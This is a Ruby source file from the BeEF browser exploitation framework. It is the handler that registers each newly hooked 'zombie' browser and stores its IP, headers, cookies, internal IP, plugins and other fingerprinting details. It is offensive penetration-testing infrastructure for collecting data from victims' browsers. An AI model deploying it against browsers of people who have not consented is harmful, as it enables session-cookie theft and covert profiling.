#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Extension
module Initialization
  
  #
  # The http handler that manages the return of the initial browser details.
  #
  class Handler 
    
    attr_reader :guard
    @data = {}

    HB = BeEF::Core::Models::HookedBrowser
    BD = BeEF::Extension::Initialization::Models::BrowserDetails
    
    def initialize(data)
      @guard = Mutex.new
      @data = data
      setup()
    end

    def setup()
      # validate hook session value
      session_id = get_param(@data, 'beefhook')
      raise WEBrick::HTTPStatus::BadRequest, "session id is invalid" if not BeEF::Filters.is_valid_hook_session_id?(session_id)
      hooked_browser = HB.first(:session => session_id)
      return if not hooked_browser.nil? # browser is already registered with framework

      # create the structure representing the hooked browser
      zombie = BeEF::Core::Models::HookedBrowser.new(:ip => @data['request'].peeraddr[3], :session => session_id)
      zombie.firstseen = Time.new.to_i

      # set the zombie hooked domain. Uses the origin header, or the host header if the origin is not present (same-domain)
      if @data['request'].header['origin'].nil? or @data['request'].header['origin'].empty?
        log_zombie_domain = @data['request'].header['host'].first
      else
        log_zombie_domain =  @data['request'].header['origin'].first
      end
      log_zombie_domain.gsub!('http://', '')
      log_zombie_domain.gsub!('https://', '')
      zombie.domain = log_zombie_domain
      zombie.httpheaders = @data['request'].header.to_json

      zombie.save # the save needs to be conducted before any hooked browser specific logging
      
      # add a log entry for the newly hooked browser
      BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}", "#{zombie.id}") 
      # get and store browser name
      browser_name = get_param(@data['results'], 'BrowserName')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid browser name" if not BeEF::Filters.is_valid_browsername?(browser_name)
      BD.set(session_id, 'BrowserName', browser_name)
      
      # get and store browser version
      browser_version = get_param(@data['results'], 'BrowserVersion')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid browser version" if not BeEF::Filters.is_valid_browserversion?(browser_version)
      BD.set(session_id, 'BrowserVersion', browser_version)

      # get and store browser string
      browser_string = get_param(@data['results'], 'BrowserReportedName')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid browser browser string" if not BeEF::Filters.is_valid_browserstring?(browser_string)
      BD.set(session_id, 'BrowserReportedName', browser_string)

      # get and store the cookies
      cookies = get_param(@data['results'], 'Cookies')
      BD.set(session_id, 'Cookies', cookies)

      # get and store the os name
      os_name = get_param(@data['results'], 'OsName')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid browser os name" if not BeEF::Filters.is_valid_osname?(os_name)
      BD.set(session_id, 'OsName', os_name)

      # get and store page title
      page_title = get_param(@data['results'], 'PageTitle')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid page title name" if not BeEF::Filters.is_valid_pagetitle?(page_title)
      BD.set(session_id, 'PageTitle', page_title)

      # get and store page title
      host_name = get_param(@data['results'], 'HostName')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid host name" if not BeEF::Filters.is_valid_hostname?(host_name)
      BD.set(session_id, 'HostName', host_name)

      # get and store the browser plugins
      browser_plugins = get_param(@data['results'], 'BrowserPlugins')
      raise WEBrick::HTTPStatus::BadRequest, "Invalid browser plugins" if not BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
      BD.set(session_id, 'BrowserPlugins', browser_plugins)

      # get and store the internal ip address
      internal_ip = get_param(@data['results'], 'InternalIP')
      if not internal_ip.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid internal IP address" if not BeEF::Filters.is_valid_ip?(internal_ip)
        BD.set(session_id, 'InternalIP', internal_ip)
      end

      # get and store the internal hostname
      internal_hostname = get_param(@data['results'], 'InternalHostname')
      if not internal_hostname.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid internal host name" if not BeEF::Filters.is_valid_hostname?(host_name)
        BD.set(session_id, 'InternalHostname', internal_hostname)
      end

      # get and store the zombie browser type
      browser_type = get_param(@data['results'], 'BrowserType')
      if browser_type.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid browser type"
      else
        BD.set(session_id, 'BrowserType', browser_type)
      end

      # get and store the zombie screen size and color depth
      screen_params = get_param(@data['results'], 'ScreenParams')
      if screen_params.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid screen size and color depth"
      else
        BD.set(session_id, 'ScreenParams', screen_params)
      end

      # get and store the window size
      window_size = get_param(@data['results'], 'WindowSize')
      if window_size.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid window size"
      else
        BD.set(session_id, 'WindowSize', window_size)
      end

      # get and store the yes|no value for JavaEnabled
      java_enabled = get_param(@data['results'], 'JavaEnabled')
      if java_enabled.nil? or java_enabled !~ /^(Yes|No)$/
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for JavaEnabled"
      else
        BD.set(session_id, 'JavaEnabled', java_enabled)
      end

      # get and store the yes|no value for VBScriptEnabled
      vbscript_enabled = get_param(@data['results'], 'VBScriptEnabled')
      if vbscript_enabled.nil? or vbscript_enabled !~ /^(Yes|No)$/
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for VBScriptEnabled"
      else
        BD.set(session_id, 'VBScriptEnabled', vbscript_enabled)
      end

      # get and store the yes|no value for HasFlash
      has_flash = get_param(@data['results'], 'HasFlash')
      if has_flash.nil? or has_flash !~ /^(Yes|No)$/
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for HasFlash"
      else
        BD.set(session_id, 'HasFlash', has_flash)
      end

      # get and store the yes|no value for HasGoogleGears
      has_googlegears = get_param(@data['results'], 'HasGoogleGears')
      if has_googlegears.nil? or has_googlegears !~ /^(Yes|No)$/
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for HasGoogleGears"
      else
        BD.set(session_id, 'HasGoogleGears', has_googlegears)
      end

      # get and store whether the browser has session cookies enabled
      has_session_cookies = get_param(@data['results'], 'hasSessionCookies')
      if has_session_cookies.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for hasSessionCookies"
      else
        BD.set(session_id, 'hasSessionCookies', has_session_cookies)
      end

      # get and store whether the browser has persistent cookies enabled
      has_persistent_cookies = get_param(@data['results'], 'hasPersistentCookies')
      if has_persistent_cookies.nil?
        raise WEBrick::HTTPStatus::BadRequest, "Invalid value for hasPersistentCookies"
      else
        BD.set(session_id, 'hasPersistentCookies', has_persistent_cookies)
      end

    end
   
    def get_param(query, key)
      return (query.class == Hash and query.has_key?(key)) ? query[key] : nil
    end
    
  end
  
end
end
end
